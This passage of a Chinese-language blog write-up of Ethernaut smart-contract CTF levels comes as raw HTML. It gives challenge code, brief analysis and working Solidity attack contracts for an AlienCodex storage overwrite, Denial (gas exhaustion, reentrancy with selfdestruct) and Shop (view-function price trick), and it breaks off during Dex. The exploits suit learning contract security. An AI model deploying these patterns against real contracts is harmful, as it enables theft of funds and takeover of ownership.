number\">0x000000000000000000000002b2E23ceC9921288f63F60A839E2B28235bc22ad</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">attack</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">make_contact</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">retract</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token builtin\">uint</span> i <span class=\"token operator\">=</span> <span class=\"token number\">2</span><span class=\"token operator\">**</span><span class=\"token number\">256</span> <span class=\"token operator\">-</span> <span class=\"token number\">1</span> <span class=\"token operator\">-</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token function\">keccak256</span><span class=\"token punctuation\">(</span>abi<span class=\"token punctuation\">.</span><span class=\"token function\">encodePacked</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">+</span><span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">revise</span><span class=\"token punctuation\">(</span>i<span class=\"token punctuation\">,</span> payload<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>此时codex.length为2**256-1，map[x]的存储地址为keccak256(slot(codex)),此处slot(map)为1，map[x]存储地址为keccak256(slot(codex))+x,所以构造x为 2^256-keccak256(1)，payload为任意地址即可覆盖Ownable-05.sol中的owner变量（owner和contact都存储在slot0）</p>\n<h1 id=\"20-Denial\"><a href=\"#20-Denial\" class=\"headerlink\" title=\"20.Denial\"></a>20.Denial</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：This is a simple wallet that drips funds over time. You can withdraw the funds slowly by becoming a withdrawing partner.</p>\n<p>If you can deny the owner from withdrawing funds when they call <code>withdraw()</code> (whilst the contract still has funds, and the transaction is of 1M gas or less) you will win this level.</p></blockquote>\n<h2 id=\"Code-19\"><a href=\"#Code-19\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Denial</span> <span class=\"token punctuation\">&#123;</span>\n\n    <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint256</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> partner<span class=\"token punctuation\">;</span> <span class=\"token comment\">// withdrawal partner - pay the gas, split the withdraw</span>\n    <span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">constant</span> owner <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xA9E</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token builtin\">uint</span> timeLastWithdrawn<span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">mapping</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token operator\">=></span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> withdrawPartnerBalances<span class=\"token punctuation\">;</span> <span class=\"token comment\">// keep track of partners balances</span>\n\n    <span class=\"token keyword\">function</span> <span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _partner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        partner <span class=\"token operator\">=</span> _partner<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// withdraw 1% to recipient and 1% to owner</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token builtin\">uint</span> amountToSend <span class=\"token operator\">=</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">.</span><span class=\"token function\">div</span><span class=\"token punctuation\">(</span><span class=\"token number\">100</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// perform a call without checking return</span>\n        <span class=\"token comment\">// The recipient can revert, the owner will still get their share</span>\n        partner<span class=\"token punctuation\">.</span>call<span class=\"token punctuation\">&#123;</span>value<span class=\"token punctuation\">:</span>amountToSend<span class=\"token punctuation\">&#125;</span><span class=\"token punctuation\">(</span><span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        owner<span class=\"token punctuation\">.</span><span class=\"token function\">transfer</span><span class=\"token punctuation\">(</span>amountToSend<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n        <span class=\"token comment\">// keep track of last withdrawal time</span>\n        timeLastWithdrawn <span class=\"token operator\">=</span> now<span class=\"token punctuation\">;</span>\n        withdrawPartnerBalances<span class=\"token punctuation\">[</span>partner<span class=\"token punctuation\">]</span> <span class=\"token operator\">=</span> withdrawPartnerBalances<span class=\"token punctuation\">[</span>partner<span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span><span class=\"token function\">add</span><span class=\"token punctuation\">(</span>amountToSend<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// allow deposit of funds</span>\n    <span class=\"token function\">receive</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span> <span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n\n    <span class=\"token comment\">// convenience function</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">contractBalance</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">return</span> <span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-18\"><a href=\"#Analyze-18\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>题目在withdraw函数中使用了call转账的方式，向partner进行转账，并且partner地址可控，所以很显然这道题的重点在于攻击合约的fallback()函数构造。</p>\n<p>而题目要求推迟对owner的transfer，只需要让交易在call处耗尽gas即可</p>\n<p>从github的wp上摘录下来的。</p>\n<table>\n<thead>\n<tr>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n<th></th>\n</tr>\n</thead>\n<tbody><tr>\n<td>expression</td>\n<td>syntax</td>\n<td>effect</td>\n<td>OPCODE</td>\n<td></td>\n</tr>\n<tr>\n<td>throw</td>\n<td><code>if (condition) &#123; throw; &#125;</code></td>\n<td>reverts all state changes and deplete gas</td>\n<td>version&lt;0.4.1: INVALID OPCODE - 0xfe, after: REVERT- 0xfd</td>\n<td>deprecated in version 0.4.13 and removed in version 0.5.0</td>\n</tr>\n<tr>\n<td>assert</td>\n<td><code>assert(condition);</code></td>\n<td>reverts all state changes and depletes all gas</td>\n<td>INVALID OPCODE - 0xfe</td>\n<td></td>\n</tr>\n<tr>\n<td>revert</td>\n<td><code>if (condition) &#123; revert(value) &#125;</code></td>\n<td>reverts all state changes, allows returning a value, refunds remaining gas to caller</td>\n<td>REVERT - 0xfd</td>\n<td></td>\n</tr>\n<tr>\n<td>require</td>\n<td><code>require(condition, &quot;comment&quot;)</code></td>\n<td>reverts all state changes, allows returning a value, refunds remaining gas to calle</td>\n<td>REVERT - 0xfd</td>\n<td></td>\n</tr>\n</tbody></table>\n<h2 id=\"Attack-17\"><a href=\"#Attack-17\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><p>poc1：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Denial</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _partner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack</span><span class=\"token punctuation\">&#123;</span>\n    Denial target<span class=\"token operator\">=</span><span class=\"token function\">Denial</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x6Ae82f201182a50F89bed000Cf30CA72E2080c34</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">assert</span><span class=\"token punctuation\">(</span><span class=\"token boolean\">false</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<p>poc2：</p>\n<pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Denial</span><span class=\"token punctuation\">&#123;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _partner<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n     <span class=\"token keyword\">function</span> <span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span><span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span>\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">attack2</span><span class=\"token punctuation\">&#123;</span>\n     Denial target<span class=\"token operator\">=</span><span class=\"token function\">Denial</span><span class=\"token punctuation\">(</span><span class=\"token number\">0x782682cf3433fF0F5223163A0120da1548f9Efe8</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">setWithdrawPartner</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span><span class=\"token keyword\">this</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token function\">fallback</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>balance<span class=\"token operator\">></span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">withdraw</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">kill</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> <span class=\"token keyword\">payable</span> addr<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">payable</span><span class=\"token punctuation\">&#123;</span>\n        <span class=\"token keyword\">selfdestruct</span><span class=\"token punctuation\">(</span>addr<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"21-Shop\"><a href=\"#21-Shop\" class=\"headerlink\" title=\"21.Shop\"></a>21.Shop</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：Сan you get the item from the shop for less than the price asked?</p>\n<p>Things that might help:</p>\n<ul>\n<li><code>Shop</code> expects to be used from a <code>Buyer</code></li>\n<li>Understanding restrictions of view functions</li>\n</ul></blockquote>\n<h2 id=\"Code-20\"><a href=\"#Code-20\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">interface</span> <span class=\"token class-name\">Buyer</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">function</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">external</span> <span class=\"token keyword\">view</span> <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token punctuation\">&#125;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Shop</span> <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token builtin\">uint</span> <span class=\"token keyword\">public</span> price <span class=\"token operator\">=</span> <span class=\"token number\">100</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">bool</span> <span class=\"token keyword\">public</span> isSold<span class=\"token punctuation\">;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token function\">buy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    Buyer _buyer <span class=\"token operator\">=</span> <span class=\"token function\">Buyer</span><span class=\"token punctuation\">(</span>msg<span class=\"token punctuation\">.</span>sender<span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n\n    <span class=\"token keyword\">if</span> <span class=\"token punctuation\">(</span>_buyer<span class=\"token punctuation\">.</span><span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">>=</span> price <span class=\"token operator\">&amp;&amp;</span> <span class=\"token operator\">!</span>isSold<span class=\"token punctuation\">)</span> <span class=\"token punctuation\">&#123;</span>\n      isSold <span class=\"token operator\">=</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">;</span>\n      price <span class=\"token operator\">=</span> _buyer<span class=\"token punctuation\">.</span><span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h2 id=\"Analyze-19\"><a href=\"#Analyze-19\" class=\"headerlink\" title=\"Analyze\"></a>Analyze</h2><p>两次调用了_buyer.price()，第一次大于100，第二次小于100即可</p>\n<h2 id=\"Attack-18\"><a href=\"#Attack-18\" class=\"headerlink\" title=\"Attack\"></a>Attack</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">contract</span> <span class=\"token class-name\">Buyer</span><span class=\"token punctuation\">&#123;</span>\n     Shop target<span class=\"token operator\">=</span><span class=\"token function\">Shop</span><span class=\"token punctuation\">(</span><span class=\"token number\">0xB77306dcaD300299355F96a9c499082176523312</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">function</span> <span class=\"token function\">price</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token keyword\">view</span>  <span class=\"token keyword\">returns</span> <span class=\"token punctuation\">(</span><span class=\"token builtin\">uint</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n      <span class=\"token keyword\">if</span><span class=\"token punctuation\">(</span>target<span class=\"token punctuation\">.</span><span class=\"token function\">isSold</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">==</span> <span class=\"token boolean\">true</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">return</span> <span class=\"token number\">1</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span><span class=\"token keyword\">else</span><span class=\"token punctuation\">&#123;</span>\n          <span class=\"token keyword\">return</span> <span class=\"token number\">110</span><span class=\"token punctuation\">;</span>\n      <span class=\"token punctuation\">&#125;</span>\n  <span class=\"token punctuation\">&#125;</span>\n    <span class=\"token keyword\">function</span> <span class=\"token function\">set</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span><span class=\"token punctuation\">&#123;</span>\n        target<span class=\"token punctuation\">.</span><span class=\"token function\">buy</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">;</span>\n    <span class=\"token punctuation\">&#125;</span>\n<span class=\"token punctuation\">&#125;</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n\n<h1 id=\"22-Dex\"><a href=\"#22-Dex\" class=\"headerlink\" title=\"22.Dex\"></a>22.Dex</h1><blockquote><span class=\"custom-blockquote-svg\"><svg width=\"24\" height=\"24\" viewBox=\"0 0 24 24\" fill=\"\" xmlns=\"http://www.w3.org/2000/svg\" data-reactroot=\"\">\n<path fill=\"\" d=\"M22 12C22 6.5 17.5 2 12 2C6.5 2 2 6.5 2 12C2 17.5 6.5 22 12 22C13.8 22 15.5 21.5 17 20.6L22 22L20.7 17C21.5 15.5 22 13.8 22 12Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\" undefined=\"1\"></path>\n<path fill=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\" undefined=\"1\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M17 8.5C15.23 8.97 14.07 10.84 14.01 13.27C14 13.33 14 13.4 14 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M9 8.5C7.23 8.97 6.07 10.84 6.01 13.27C6 13.33 6 13.4 6 13.47V13.5\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M15.97 11.5H16.04C17.12 11.5 18 12.38 18 13.47V13.53C18 14.62 17.12 15.5 16.03 15.5H15.96C14.88 15.5 14 14.62 14 13.53V13.46C14 12.38 14.88 11.5 15.97 11.5Z\"></path>\n<path stroke-linejoin=\"round\" stroke-linecap=\"round\" stroke-miterlimit=\"10\" stroke-width=\"2\" stroke=\"\" d=\"M7.97 11.5H8.04C9.12 11.5 10 12.38 10 13.47V13.53C10 14.62 9.12 15.5 8.03 15.5H7.97C6.88 15.5 6 14.62 6 13.53V13.46C6 12.38 6.88 11.5 7.97 11.5Z\"></path>\n</svg>\n</span><p>题目要求：取光任一token</p></blockquote>\n<h2 id=\"Code-21\"><a href=\"#Code-21\" class=\"headerlink\" title=\"Code\"></a>Code</h2><pre class=\"line-numbers language-solidity\" data-language=\"solidity\"><code class=\"language-solidity\"><span class=\"token keyword\">pragma</span> <span class=\"token keyword\">solidity</span> <span class=\"token operator\">^</span><span class=\"token version number\">0.6.0</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/IERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">\"@openzeppelin/contracts/token/ERC20/ERC20.sol\"</span><span class=\"token punctuation\">;</span>\n<span class=\"token keyword\">import</span> <span class=\"token string\">'@openzeppelin/contracts/math/SafeMath.sol'</span><span class=\"token punctuation\">;</span>\n\n<span class=\"token keyword\">contract</span> <span class=\"token class-name\">Dex</span>  <span class=\"token punctuation\">&#123;</span>\n  <span class=\"token keyword\">using</span> <span class=\"token class-name\">SafeMath</span> <span class=\"token keyword\">for</span> <span class=\"token builtin\">uint</span><span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token1<span class=\"token punctuation\">;</span>\n  <span class=\"token builtin\">address</span> <span class=\"token keyword\">public</span> token2<span class=\"token punctuation\">;</span>\n  <span class=\"token keyword\">constructor</span><span class=\"token punctuation\">(</span><span class=\"token builtin\">address</span> _token1<span class=\"token punctuation\">,</span> <span class=\"token builtin\">address</span> _token2<span class=\"token punctuation\">)</span> <span class=\"token keyword\">public</span> <span class=\"token punctuation\">&#123;</span>\n    token1 <span class=\"token operator\">=</span> _token1<span class=\"token punctuation\">;</span>\n    token2 <span class=\"token operator\">=</span> _token2<span class=\"token punctuation\">;</span>\n  <span class=\"token punctuation\">&#125;</span>\n\n  <span class=\"token keyword\">function</span> <span class=\"token 